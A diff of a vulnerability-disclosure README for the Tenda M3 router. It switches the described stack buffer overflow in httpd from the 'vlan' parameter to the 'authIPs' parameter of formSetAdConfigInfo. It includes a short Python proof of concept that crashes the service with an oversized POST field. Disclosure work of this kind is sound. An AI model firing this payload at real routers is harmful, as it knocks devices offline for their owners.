@@ -1,4 +1,4 @@
-# Tenda M3 contains Stack Overflow Vulnerability
+# Tenda M3 contains Stack  Overflow Vulnerability
 
 ## overview
 
@@ -16,13 +16,11 @@
 
 ### 1. Vulnerability Details
 
-the `httpd` in directory `/bin` has a stack overflow. The vunlerability is in fucntion `fromSetLocalVlanInfo` 
+the `httpd` in directory `/bin` has a stack buffer overflow. The vunlerability is in fucntion `formSetAdConfigInfo` 
 
-![image-20220819084852048](readme.assets/image-20220819084852048.png)
+![image-20220819230539184](readme.assets/image-20220819230539184.png)
 
-In this function, is copies POST parameter `vlan` to stack buffer without checking its length, causing a stack overflow vulnerability. 
-
-**It is similar to [this vuln](https://github.com/xxy1126/Vuln/tree/main/5), but the parameter is different**
+In this function, is copies POST parameter `authIPs` to stack buffer without checking its length, causing a stack buffer overflow vulnerability. 
 
 ### 2. Recurring loopholes and POC
 
@@ -37,16 +35,17 @@ poc of DOS(deny of service)
 import requests
 
 data = {
-    "action": "add", 
-    "vlan": "a"*0x300
+    "authIPs": "a"*0x1000
 }
 cookies = {
     "user": "admin"
 }
-res = requests.post("http://127.0.0.1/goform/setVlanInfo", data=data, cookies=cookies)
+res = requests.post("http://127.0.0.1/goform/setAdConfigInfo", data=data, cookies=cookies)
 print(res.content)
-
 ```
 
-![image-20220819084838525](readme.assets/image-20220819084838525.png)
+![image-20220819230350775](readme.assets/image-20220819230350775.png)
 
+![image-20220819230438042](readme.assets/image-20220819230438042.png)
+
+![image-20220819230449739](readme.assets/image-20220819230449739.png)
